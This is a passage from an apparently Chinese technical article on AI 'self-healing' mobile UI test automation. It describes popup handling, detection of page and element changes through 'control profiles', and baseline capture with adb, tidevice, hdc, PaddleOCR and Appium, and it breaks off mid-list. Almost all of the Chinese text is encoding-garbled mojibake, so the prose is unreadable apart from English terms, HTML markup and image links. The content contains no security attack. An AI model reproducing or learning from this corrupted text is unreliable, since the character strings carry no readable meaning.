<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5080afb65b349609d4a6c1816068f3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=3lTjv6W9xpvbEHdU%2BYr6nshd20I%3D" alt="image.png" loading="lazy"/></p>
<p>AIé©±åŠ¨çš„UIè‡ªåŠ¨åŒ–ï¼Œçªç ´ä¼ ç»Ÿâ€œè„šæœ¬å¤±æ•ˆå³ä¸­æ–­â€çš„è„†å¼±æ¨¡å¼ï¼Œæ„å»ºæ„ŸçŸ¥-è¯Šæ–­-å†³ç­–-ä¿®å¤çš„æ™ºèƒ½é—­ç¯ä½“ç³»ï¼Œå…¶æ ¸å¿ƒä¼˜åŠ¿åœ¨äºï¼š</p>
<ul>
<li><strong>ç²¾å‡†é—®é¢˜å®šä½ï¼š</strong> å½“ç”¨ä¾‹æ‰§è¡Œä¸­æ–­æ—¶ï¼ŒAIè‡ªæ„ˆé€šè¿‡å¤šæ¨¡æ€æ•°æ®ï¼ˆæˆªå›¾ã€OCRã€DOMã€Exceptionï¼‰è¿›è¡Œæ™ºèƒ½è¯Šæ–­ï¼Œç»“åˆçŸ¥è¯†åº“ã€æ§ä»¶ç”»åƒç²¾å‡†è¯†åˆ«é—®é¢˜ç±»å‹ï¼ˆå¼¹çª—ä¸­æ–­ã€å…ƒç´ å˜æ›´ç­‰ï¼‰ã€‚</li>
<li><strong>é—­ç¯è‡ªæ„ˆèƒ½åŠ›ï¼š</strong> è¯Šæ–­ç»“æœç›´æ¥ç”Ÿæˆç»“æ„åŒ–<code>Action</code>æŒ‡ä»¤ï¼ˆå¦‚â€œå¼¹çª—å…³é—­â€æˆ–â€œå®šä½å™¨ä¿®å¤â€ï¼‰ï¼Œé€šè¿‡æ˜ å°„è„šæœ¬é‡è¯•ï¼Œä»»åŠ¡æˆåŠŸåè‡ªåŠ¨æ›´æ–°ç”¨ä¾‹åº“ï¼Œå®ç°â€œå‘ç°é—®é¢˜â†’åˆ†æé—®é¢˜â†’è§£å†³é—®é¢˜â€çš„å®Œæ•´é—­ç¯ï¼Œæ— éœ€äººå·¥ä»‹å…¥ã€‚</li>
</ul>
<h2 data-id="heading-3">å››ã€AIè‡ªæ„ˆèƒ½åŠ›æ„å»º</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/110c08bf8b684988a52a564bf425b3f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=HIRniX49CBgI2PWbfw3IvJHEnDM%3D" alt="image.png" loading="lazy"/>
AIé©±åŠ¨çš„UIè‡ªåŠ¨åŒ–æ–°èŒƒå¼ç³»ç»Ÿæ¶æ„é‡‡ç”¨å¤šå±‚èƒ½åŠ›è®¾è®¡ï¼Œå„å±‚èŒè´£æ˜ç¡®ã€ååŒè¿ä½œï¼š</p>
<ul>
<li>
<p><strong>èƒ½åŠ›å»ºè®¾å±‚é¢</strong> æä¾›å››å¤§æ ¸å¿ƒèƒ½åŠ›ï¼Œå¼¹çª—æ™ºèƒ½å¤„ç†ã€æ–‡æœ¬è‡ªæ„ˆã€å…ƒç´ è‡ªæ„ˆã€æ™ºèƒ½ç­‰å¾…ï¼Œç›´æ¥é¢å‘æµ‹è¯•åœºæ™¯ä¸­çš„å›°éš¾è§£å†³å…·ä½“é—®é¢˜ã€‚</p>
</li>
<li>
<p><strong>æ•°æ®é‡‡é›†å±‚é¢</strong></p>
<ul>
<li>å¤šæ¨¡æ€æ•°æ®åŸºçº¿ï¼šæ•´åˆAPPä¿¡æ¯ã€ç”¨ä¾‹æ­¥éª¤ã€è®¾å¤‡å¿«ç…§ã€OCRä¸DOMæ•°æ®ï¼›</li>
<li>ç”¨ä¾‹åº“ç®¡ç†ï¼šé€šè¿‡è„šæœ¬æ˜ å°„ã€è‡ªæ„ˆæ ‡è®°å®ç°ç”¨ä¾‹æ™ºèƒ½æ›´æ–°ï¼Œç¡®ä¿ä¿®å¤æˆæœæŒç»­æ²‰æ·€ã€‚</li>
</ul>
</li>
<li>
<p><strong>UIè‡ªæ„ˆAgentå±‚é¢</strong></p>
<ul>
<li>çŸ¥è¯†åº“ï¼šæ²‰æ·€ä¸šåŠ¡çŸ¥è¯†ã€å†å²ç»éªŒã€å¼¹çª—ç‰¹å¾ä¸è§„åˆ™æ¨¡æ¿ï¼›</li>
<li>æ™ºèƒ½å¼•æ“ï¼šé©±åŠ¨å¼¹çª—åˆ†æã€æ–‡æœ¬/å…ƒç´ å˜æ›´æ„ŸçŸ¥ç­‰æ ¸å¿ƒèƒ½åŠ›ï¼›</li>
<li>æ™ºèƒ½å†³ç­–ä½“ï¼šå®ç°é—®é¢˜è¯Šæ–­ä¸è¡ŒåŠ¨å†³ç­–çš„é—­ç¯ï¼Œæ˜¯â€œè‡ªæ„ˆå¤§è„‘â€ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">4.1 äº”æ­¥è¯Šæ–­æ³•</h3>
<p>å½“æµ‹è¯•ä»»åŠ¡å¼‚å¸¸ä¸­æ–­æ—¶ï¼ŒAIè‡ªæ„ˆä¼šæ‰§è¡Œäº”æ­¥åˆ†å±‚è¯Šæ–­æµç¨‹ï¼šé¦–å…ˆæ£€æµ‹è®¾å¤‡å¥åº·çŠ¶æ€ï¼ˆå†…å­˜/ç£ç›˜/ç½‘ç»œ/ç‰©ç†è¿æ¥ï¼‰ï¼Œå…¶æ¬¡éªŒè¯è‡ªåŠ¨åŒ–æ¡†æ¶å¯ç”¨æ€§ï¼ˆä¼šè¯çŠ¶æ€ä¸é©±åŠ¨æœåŠ¡ï¼‰ï¼Œç¬¬ä¸‰æ­¥é€šè¿‡AIå¤§æ¨¡å‹èåˆå¼¹çª—çŸ¥è¯†åº“è¯†åˆ«å¹²æ‰°å¼¹çª—ç±»å‹æ™ºèƒ½å¤„ç†ï¼Œç¬¬å››æ­¥åˆ©ç”¨è§†è§‰è¯­è¨€æ¨¡å‹ï¼ˆVLMï¼‰åˆ†æé¡µé¢åŠ è½½çŠ¶æ€ä¸å†…å®¹å®Œæ•´æ€§ï¼Œæœ€ååŸºäºæ§ä»¶ç”»åƒä¸å†å²åŸºçº¿è¿›è¡Œå¤šæ¨¡æ€å¤§æ¨¡å‹æ¯”å¯¹ï¼Œç²¾å‡†æ„ŸçŸ¥å…ƒç´ å˜æ›´ã€‚AIè‡ªæ„ˆé‡‡ç”¨é€’è¿›å¼å†³ç­–æœºåˆ¶ï¼Œæ¯æ­¥è¾“å‡ºç»“æ„åŒ–ä¿®å¤æŒ‡ä»¤ï¼ˆå¦‚â€œå¼¹çª—ä¸­æ–­â†’å®‰å…¨å…³é—­â€ã€â€œå…ƒç´ å˜æ›´â†’åŠ¨æ€é‡æ„å®šä½å™¨â€ï¼‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2729240d4493417990f2ac3df35c84c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=oKYmPc3iVvhcOqVvPnqLPaCJXxM%3D" alt="image.png" loading="lazy"/></p>
<p>äº”æ­¥è¯Šæ–­æµç¨‹ç”±è‡ªæ„ˆå¼•æ“æœåŠ¡æ¥é©±åŠ¨ï¼Œå„å±‚çº§è¯Šæ–­ç»“æœä¼šè¾“å‡ºç»“æ„åŒ–çš„å¯æ‰§è¡Œä¿®å¤æŒ‡ä»¤ã€‚è‡ªæ„ˆå¼•æ“æœåŠ¡æ—¶åºå›¾å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71c2cfc3a061430b89abb0a761429b96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=FI7U2bBtFJzyqURED7Ko5CEmFbE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">4.2 å¼¹çª—æ™ºèƒ½å¤„ç†å¼•æ“</h3>
<h4 data-id="heading-6">4.2.1 è·¨å¹³å°å¼¹çª—ç¢ç‰‡åŒ–æŒ‘æˆ˜</h4>
<p>è·¨å¹³å°å¼¹çª—ç¢ç‰‡åŒ–æŒ‘æˆ˜ï¼šåœ¨Android/iOS/HarmonyOSå¤šå¹³å°ã€OPPO/vivo/å°ç±³ç­‰å“ç‰ŒåŠMIUI/ColorOSç­‰å®šåˆ¶ç³»ç»Ÿç¯å¢ƒä¸‹ï¼ŒåŒç±»å¼¹çª—ï¼ˆå¦‚ä½ç½®æƒé™ç”³è¯·ï¼‰å‘ˆç°é«˜åº¦å·®å¼‚åŒ–çš„UIè¡¨ç°ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œä»…ä½ç½®æƒé™å¼¹çª—åœ¨ä¸åŒè®¾å¤‡ä¸Šçš„æŒ‰é’®å¸ƒå±€ã€æ–‡æ¡ˆè¡¨è¿°åŠäº¤äº’æ¨¡å¼å‡å­˜åœ¨æ˜¾è‘—å·®å¼‚ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ebb93567d9f4aa6beea60276742658e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=pK%2F0z2yUJSJeOCbapTH9h8u6UCM%3D" alt="" loading="lazy"/></p>
<p>Androidæ–¹é¢ï¼Œä¼ ç»Ÿæ–¹æ¡ˆï¼ˆå¦‚åŸºäº<code>DeviceOwner</code>æƒé™è‡ªåŠ¨æˆæƒï¼‰ä»…èƒ½è¦†ç›–éƒ¨åˆ†åœºæ™¯ï¼Œå¯¹å‚å•†æ·±åº¦å®šåˆ¶çš„Romï¼ˆéšç§åˆè§„ã€ç³»ç»Ÿé€šçŸ¥ç±»ï¼ŒOPPOç³»å¼¹çª—ï¼‰ä»å­˜åœ¨é€‚é…ç›²åŒºï¼ŒiOSå’ŒHarmonyæ–¹é¢åˆ™ç¼ºå°‘è‡ªåŠ¨æˆæƒæ¨¡å¼ã€‚æ‰€ä»¥è¿˜æœ‰éƒ¨åˆ†æ–¹æ¡ˆè¿˜æ˜¯é€šè¿‡è§„åˆ™æ¥åŒ¹é…ï¼Œä½†æ˜¯æ— è®ºæˆ‘ä»¬åŠ å¤šå°‘å±‚åŒ¹é…ï¼Œä¸‹æ¬¡æ‰§è¡Œçš„æ—¶å€™è¿˜æ˜¯ä¼šå‡ºç°æ–°çš„é—®é¢˜ã€‚</p>
<h4 data-id="heading-7">4.2.2 ç»“æ„åŒ–å¼¹çª—ç‰¹å¾å»ºæ¨¡</h4>
<p>æˆ‘ä»¬çš„è§£æ³•ä¸å†ç©·ä¸¾æ¨¡å¼ï¼Œè€Œæ˜¯æ„å»ºç‰¹å¾å¼¹çª—è®¤çŸ¥ä½“ç³»ï¼šVLå¤§æ¨¡å‹ä»è§†è§‰å¸ƒå±€ã€è¯­ä¹‰å…³é”®è¯ç»´åº¦æŠ½è±¡å¼¹çª—æœ¬è´¨ç‰¹å¾ï¼Œå¯¹å¼¹çª—è¿›è¡Œå¤šç»´åº¦ã€è¯­ä¹‰åŒ–çš„å½’ç±»å»ºæ¨¡ï¼ˆå¦‚æŒ‰æƒé™ã€ç³»ç»Ÿé€šçŸ¥ç­‰ç±»å‹ï¼‰ï¼Œå°†å…¶æ³›åŒ–ä¸ºå¯ç†è§£çš„ç»“æ„åŒ–çŸ¥è¯†ï¼Œæœ€åè¾“å…¥ç»™å¤§æ¨¡å‹åˆ†æå¹¶æ¨ç†å¼¹çª—å’Œå†³ç­–å¤„ç†ã€‚</p>
<p>è¿™é‡Œåˆ—ä¸¾ä¸€ä¸‹å¸¸è§çš„å¼¹çª—ç±»å‹ï¼š</p>
<ol>
<li>æƒé™ç”³è¯·ç±»ï¼šä½ç½®ã€å­˜å‚¨ã€é€šçŸ¥ã€ç”µè¯ã€çŸ­ä¿¡ç­‰ï¼›</li>
<li>ç³»ç»Ÿé€šçŸ¥ç±»ï¼šç³»ç»Ÿæ›´æ–°ã€ç”µé‡è­¦å‘Šã€ç³»ç»Ÿæ¨é€ã€å­˜å‚¨ä¸è¶³ç­‰ï¼›</li>
<li>éšç§åˆè§„ç±»ï¼šæ•°æ®æ”¶é›†ã€éšç§åˆè§„ç­‰ï¼›</li>
<li>å‚å•†å®šåˆ¶ç±»ï¼šä¼˜åŒ–å»ºè®®ã€è‡ªå¯åŠ¨ã€çœç”µæ¨¡å¼æ¿€æ´»ç­‰ç­‰ã€‚</li>
</ol>
<p>æš‚æ—¶æ— æ³•åœ¨é£ä¹¦æ–‡æ¡£å¤–å±•ç¤ºæ­¤å†…å®¹</p>
<p>ä¸å…ˆå‰æ¢ç´¢çš„ä¼ ç»Ÿæ–¹å¼æ¯”è¾ƒï¼Œä»â€œæœºæ¢°åŒ¹é…â€å‡çº§ä¸ºâ€œæ™ºèƒ½è®¤çŸ¥â€å¤„ç†ï¼Œä¼˜åŠ¿å¦‚ä¸‹ï¼š</p>









































<table><thead><tr><th>ç»´åº¦</th><th>æšä¸¾æ³•</th><th>AIæ™ºèƒ½å¤„ç†</th><th>AIä¼˜åŠ¿</th></tr></thead><tbody><tr><td>å¤„ç†é€»è¾‘</td><td>åŸºäºå›ºå®šè§„åˆ™åŒ¹é…</td><td>åŸºäºè¯­ä¹‰ç†è§£ä¸ç‰¹å¾æ³›åŒ–</td><td>èƒ½å¤„ç†æœªè§è¿‡çš„å¼¹çª—å˜ä½“</td></tr><tr><td>å†³ç­–ç²¾åº¦</td><td>æ˜“å—UIå˜åŠ¨å½±å“</td><td>å·®å¼‚åŒ–å¤„ç†ï¼šåŒæ„ã€ç¡®è®¤ã€å¥½çš„...</td><td>å…·å¤‡é²æ£’æ€§ï¼Œå¯ä»¥åŠ¨æ€è‡ªé€‚åº”</td></tr><tr><td>å¤ç”¨ä»·å€¼</td><td>è„šæœ¬å†…åµŒï¼Œéš¾å…±äº«</td><td>å¹³å°é€šç”¨èƒ½åŠ›</td><td>ç‹¬ç«‹çš„æ•°æ®èµ„äº§</td></tr><tr><td>ç»´æŠ¤æˆæœ¬</td><td>éœ€äººå·¥æ·»åŠ è§„åˆ™ï¼Œçº¿æ€§å¢åŠ </td><td>ç‰¹å¾åº“è½»é‡è¾ƒå‡†ï¼Œå¾®è°ƒå³å¯</td><td>ç»´æŠ¤æˆæœ¬ä½</td></tr><tr><td>æ¼”è¿›èƒ½åŠ›</td><td>é™æ€å›ºåŒ–</td><td>åŠ¨æ€å­¦ä¹ </td><td>å…·å¤‡çŸ¥è¯†å­¦ä¹ èƒ½åŠ›</td></tr></tbody></table>
<h3 data-id="heading-8">4.3 é¡µé¢å˜åŒ–æ™ºèƒ½æ„ŸçŸ¥å¼•æ“</h3>
<p>ç»“åˆæˆ‘ä»¬çš„å†å²æ•°æ®æ•´ç†åˆ†æï¼Œå¸¸è§çš„UIå˜æ›´åŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p><strong>æ–‡æ¡ˆè°ƒæ•´ç±»</strong></p>
<ul>
<li>äº§å“ä¸ºä¼˜åŒ–ç”¨æˆ·æç¤ºä½“éªŒï¼Œä¾‹å¦‚ï¼Œå°†æ–‡æ¡ˆä» â€œç¡®å®šåŠ ä»·5å…ƒå—?â€ è°ƒæ•´ä¸º â€œæ‚¨ç¡®å®šåŠ ä»· 5å…ƒå—?â€ã€‚ä»æ–‡æœ¬å˜æ›´è§’åº¦çœ‹ï¼ŒåŒ…å«ä¸¤å¤„ç»†å¾®ä½†å…¸å‹çš„è°ƒæ•´ï¼š</li>
<li>å¥é¦–æ–°å¢æ•¬è¯­â€œæ‚¨â€ï¼Œæå‡è¯­æ°”å‹å¥½åº¦ï¼›</li>
<li>â€œ5å…ƒâ€å‰æ’å…¥ç©ºæ ¼ï¼›</li>
</ul>
</li>
<li>
<p><strong>IDé‡æ„ç±»</strong></p>
<ul>
<li>IDçš„é‡æ–°å‘½åå’Œå‡ºäºå®‰å…¨ã€æ··æ·†æˆ–å·¥ç¨‹è§„èŒƒè€ƒè™‘ï¼Œæ§ä»¶ ID çš„åŠ¨æ€åŒ–ä¹Ÿæ—¥ç›Šæ™®éã€‚å¼€å‘å›¢é˜Ÿå¸¸å°†é™æ€ IDï¼ˆå¦‚ <code>btn_confirm</code>ï¼‰æ›¿æ¢ä¸ºè¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ IDï¼ˆå¦‚ <code>btn_confirm_a6p6a8</code> æˆ–å®Œå…¨ç§»é™¤ IDï¼‰ï¼Œå¯¼è‡´ä¼ ç»ŸåŸºäº <code>resource-id</code> æˆ– <code>accessibility-id</code> çš„å®šä½ç­–ç•¥å½»åº•å¤±æ•ˆã€‚</li>
</ul>
</li>
<li>
<p><strong>å¸ƒå±€é‡æ„ç±»</strong></p>
<ul>
<li>ä¸ºæå‡ UI æ¸²æŸ“æ€§èƒ½ï¼Œå¼€å‘å›¢é˜Ÿå¸¸å¯¹æ§ä»¶å¸ƒå±€ä¸å±‚çº§ç»“æ„è¿›è¡Œä¼˜åŒ–ï¼ˆå¦‚å‡å°‘åµŒå¥—å±‚çº§ã€æ›¿æ¢å®¹å™¨ç±»å‹ç­‰ç­‰ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ç±»ç»“æ„æ€§è°ƒæ•´å¾€å¾€å¯¼è‡´é«˜åº¦ä¾èµ– DOM è·¯å¾„çš„ XPath å®šä½å™¨é›†ä½“å¤±æ•ˆã€‚</li>
</ul>
</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥å½’çº³é¡µé¢çš„å˜åŒ–åŒ…æ‹¬æ–‡æœ¬ï¼ˆTextï¼‰å’Œå…ƒç´ ï¼ˆElementï¼‰è°ƒæ•´ï¼Œé’ˆå¯¹äºè¿™äº›UIçš„è°ƒæ•´ï¼Œä¼ ç»Ÿçš„UIè‡ªåŠ¨åŒ–å¹¶ä¸èƒ½è‡ªé€‚åº”ï¼Œæ­¤æ—¶ï¼Œéœ€å¼•å…¥é¡µé¢å˜åŒ–æ„ŸçŸ¥èƒ½åŠ›ï¼šåŸºäºå¤šæ¨¡æ€åŸºçº¿ï¼ˆæˆªå›¾ã€OCRã€DOMï¼‰ä¸æ§ä»¶ç”»åƒï¼ˆç±»å‹ã€å±‚çº§ã€ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯¹ UI å˜æ›´è¿›è¡Œç»“æ„åŒ–æ¯”å¯¹ï¼Œå‡†ç¡®è¯†åˆ«å˜æ›´æ€§è´¨ï¼Œä»è€Œåœ¨Textã€IDã€ XPath ç­‰å®šä½å™¨å¤±æ•ˆæ—¶ï¼Œç²¾å‡†è§¦å‘è‡ªæ„ˆä¿®å¤ï¼Œé¿å…æ— æ•ˆé‡è¯•ã€‚å¯¹æ¯”æ–¹æ¡ˆå›¾å‚è€ƒï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2d67c4ed0a5462ea536a6e881c82112~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=JP3DAFqTQ6G1AW%2Bpg6Evz9bKSTM%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">4.3.1 èµ‹äºˆæ§ä»¶â€œæ•°å­—èº«ä»½è¯â€</h4>
<p>åœ¨å®è·µè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°ï¼Œç”±ç¯å¢ƒå™ªéŸ³ç­‰éUIå˜æ›´å› ç´ å¯¼è‡´çš„ä¸´æ—¶æ€§å¤±è´¥ï¼Œæµ‹è¯•ä¸­æ–­å AI è‡ªæ„ˆæ³›åŒ–åä¼šè¯¯åˆ¤ï¼Œåšäº†ä¸€äº›æ— æ•ˆé‡è¯•ï¼Œæ—¢å¢åŠ äº†æµ‹è¯•æ—¶é•¿å½±å“æ•ˆç‡ï¼Œä¹Ÿæ‹‰ä½äº†æ•´ä½“è‡ªæ„ˆæˆåŠŸç‡ã€‚ä¸ºè§£å†³è¿™ä¸€é—®é¢˜ï¼Œæˆ‘ä»¬å¼•å…¥æ§ä»¶ç”»åƒæœºåˆ¶ã€‚æ§ä»¶ç”»åƒæ˜¯å¯¹ UI ç•Œé¢ä¸­ä»»ä¸€äº¤äº’å…ƒç´ ï¼ˆå¦‚æ–‡æœ¬ã€æŒ‰é’®ã€è¾“å…¥æ¡†ç­‰ï¼‰è¿›è¡Œçš„å¤šç»´åº¦ã€ç»“æ„åŒ–ç‰¹å¾åˆ»ç”»ï¼ŒåŒ…å«å…¶å†…åœ¨å±æ€§ï¼ˆç±»å‹ï¼‰ã€ç»“æ„å…³ç³»ï¼ˆå±‚çº§ï¼‰ä¸ç¯å¢ƒä¸Šä¸‹æ–‡ï¼ˆå‘¨å›´ï¼‰ï¼Œå½¢æˆè¯¥æ§ä»¶çš„â€œæ•°å­—èº«ä»½â€ï¼Œåœ¨åŸºçº¿é‡‡é›†é˜¶æ®µï¼Œæˆ‘ä»¬ä¸ºç”¨ä¾‹çš„å…³é”®æ“ä½œæ­¥éª¤ç”Ÿæˆå¯¹åº”çš„æ§ä»¶ç”»åƒï¼Œä½œä¸ºåç»­å˜æ›´æ„ŸçŸ¥ä¸æ™ºèƒ½ä¿®å¤çš„æ ¸å¿ƒä¾æ®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe234dc79bef415ab66550f249aa7858~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=bZub3Dlc9Nm4TZ5fi9n%2BqGTZfrk%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ§ä»¶ç±»å‹</strong>ï¼šæè¿°æ§ä»¶çš„åŠŸèƒ½ç±»åˆ«å’Œè§†è§‰è¡¨ç°ï¼Œå¯ä»¥ä»æ§ä»¶çš„ç±»åï¼ˆidã€Classï¼‰ã€åŠŸèƒ½ç±»å‹ï¼ˆè¯­ä¹‰è§’è‰²ï¼‰ã€æ–‡æœ¬å†…å®¹ã€è§†è§‰ç‰¹å¾ã€äº¤äº’çš„å±æ€§ç­‰ç»´åº¦æè¿°ï¼Œç›®çš„æ˜¯ä¸ºäº†è¯†åˆ«â€œè¿™æ˜¯ä¸€ä¸ª<strong>æ©™è‰²çš„ç¡®è®¤æŒ‰é’®</strong>â€ï¼Œè€Œéç®€å•çš„â€œä¸€ä¸ªidä¸ºbtn_confirmâ€çš„å…ƒç´ ã€‚</p>
<p><strong>å…³ç³»ä¸Šä¸‹æ–‡ï¼š</strong> æè¿°æ§ä»¶æ‰€å¤„çš„é¡µé¢è¯­ä¹‰ä¸äº¤äº’ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥é¡µé¢å…¨æ–‡ç†è§£ã€ä¸šåŠ¡ä¸Šä¸‹æ–‡ç­‰æ–¹é¢æè¿°ï¼Œç†è§£â€œè¿™æ˜¯<strong>éšç§æ”¿ç­–åè®®åº•éƒ¨çš„åŒæ„æŒ‰é’®</strong>â€ï¼Œè€Œéä»»æ„â€œåŒæ„â€æ–‡æœ¬ã€‚</p>
<p><strong>ç»“æ„å…³ç³»</strong>ï¼šæè¿°æ§ä»¶åœ¨ UI æ ‘ä¸­çš„ç»“æ„ä½ç½®ä¸çˆ¶å­å…³ç³»ï¼Œå¯ä»¥ä»DOMè·¯å¾„ã€æ·±åº¦å±‚çº§ã€çˆ¶å®¹å™¨ã€å…„å¼ŸèŠ‚ç‚¹ã€å­èŠ‚ç‚¹ç­‰ç»´åº¦æè¿°ï¼Œç›®çš„æ˜¯ä¸ºäº†æŠ—å¸ƒå±€å¾®è°ƒã€‚</p>
<p>æ§ä»¶ç”»åƒç›¸è¾ƒäºä¼ ç»Ÿå®šä½å™¨ä»…ä¾èµ–å•ä¸€å±æ€§ï¼Œæ§ä»¶ç”»åƒé€šè¿‡å¤šç»´åº¦ç‰¹å¾èåˆï¼ˆç±»å‹ã€å±‚çº§ã€ä¸Šä¸‹æ–‡ï¼‰ï¼Œæ˜¾è‘—æå‡äº†æ§ä»¶è¯†åˆ«çš„é²æ£’æ€§ä¸å¯è§£é‡Šæ€§ã€‚æ›´ä¸ºé‡è¦çš„æ˜¯ï¼Œåœ¨åŸºäºå¤§æ¨¡å‹çš„åŸºçº¿æ¯”å¯¹æµç¨‹ä¸­ï¼Œæ§ä»¶ç”»åƒä½œä¸ºç»“æ„åŒ–å…ˆéªŒçŸ¥è¯†ï¼Œå¯ä»¥æœ‰æ•ˆçº¦æŸå¤§æ¨¡å‹è¾“å‡ºï¼Œå‡å°‘å…¶å› è¿‡åº¦æ³›åŒ–è€Œäº§ç”Ÿè¯¯åˆ¤ï¼Œæ˜¯å®ç°â€œæ™ºèƒ½ä½†ä¸å¤±æ§â€çš„å…³é”®æœºåˆ¶ã€‚
å¦‚å›¾æ‰€ç¤ºï¼Œå¤§æ¨¡å‹åœ¨å¼•å…¥æ§ä»¶ç”»åƒåçš„è¯Šæ–­ç»“æœçš„å·®å¼‚ï¼š</p>
<ul>
<li><strong>æœªå¼•å…¥æ§ä»¶ç”»åƒ</strong> <strong>ï¼š</strong> å¤§æ¨¡å‹å°†â€œä¸“ç¥¨(æ’®åˆ)â€æ³›åŒ–æˆç±»ä¼¼è¯­ä¹‰çš„â€œå¼€ç¥¨â€ï¼›</li>
<li><strong>å¼•å…¥æ§ä»¶ç”»åƒ</strong> <strong>ï¼š</strong> å¤§æ¨¡å‹å°†â€œä¸“ç¥¨(æ’®åˆ)â€åˆ¤å®šä¸ºç§»é™¤ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd47cc0050d64073a65c96ae59de661f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=KtZKMbwdjj%2BROV%2BYT7fYDXEGGXQ%3D" alt="screenshot-20260203-194234.png" loading="lazy"/></p>
<h4 data-id="heading-10">4.3.2 æ–‡æœ¬ã€å…ƒç´ å˜åŒ–è‡ªæ„ˆ</h4>
<p>å¯¹äºé¡µé¢å˜åŒ–æ„ŸçŸ¥å’Œè‡ªæ„ˆå¼•æ“çš„å®ç°ï¼Œå¯ä»¥ç®€å•åˆ†ä¸ºä¸‰é˜¶æ®µæµç¨‹å®ç°å¯¹é¡µé¢å˜åŒ–çš„ç²¾å‡†æ„ŸçŸ¥ä¸æ™ºèƒ½ä¿®å¤èƒ½åŠ›ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6890f21435814e35abe301f83ed7b994~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=dBgwMR2WYCUgdK67NUzhxrPRBEk%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>åŸºçº¿æ„å»ºé˜¶æ®µ</li>
</ul>
<p>åœ¨ç”¨ä¾‹æˆåŠŸæ‰§è¡Œæ—¶ï¼Œæˆ‘ä»¬ä¼šåŒæ­¥é‡‡é›†ä¸‰ç±»æ•°æ®ï¼š é€šè¿‡ adb (Android)ã€tidevice (iOS)ã€hdc (HarmonyOS) è·å–è®¾å¤‡æˆªå›¾å¿«ç…§ï¼ŒPaddleOCR æå–é¡µé¢æ–‡æœ¬å†…å®¹ï¼Œ Appiumã€hdc è·å–å½“å‰æ§ä»¶æ ‘ç»“æ„ã€‚å°†è¿™äº›å¤šæ¨¡æ€æ•°æ®èåˆåï¼ŒåŒæ—¶ç”Ÿæˆç›®æ ‡æ§ä»¶çš„ç»“æ„åŒ–æè¿°ï¼ˆå³æ§ä»¶ç”»åƒï¼‰ã€‚ä¸ºé™ä½å¤§æ¨¡å‹æ¨ç†è€—æ—¶ä¸ tokensæ¶ˆè€—ï¼Œæˆ‘ä»¬åœ¨é‡‡é›†è¿‡ç¨‹ä¸­ä¼šå¯¹æˆªå›¾è¿›è¡Œå‹ç¼©å’Œéå…³é”®åŒºåŸŸï¼ˆçŠ¶æ€æ ã€å¯¼èˆªæ ï¼‰å‰ªåˆ‡ï¼Œå¹¶å¯¹æ§ä»¶æ ‘è¿›è¡Œå†—ä½™èŠ‚ç‚¹æ¸…æ´—ã€‚</p>
<ul>
<li>
<p><strong>å˜åŒ–æ„ŸçŸ¥é˜¶æ®µ</strong></p>
<ul>
<li>
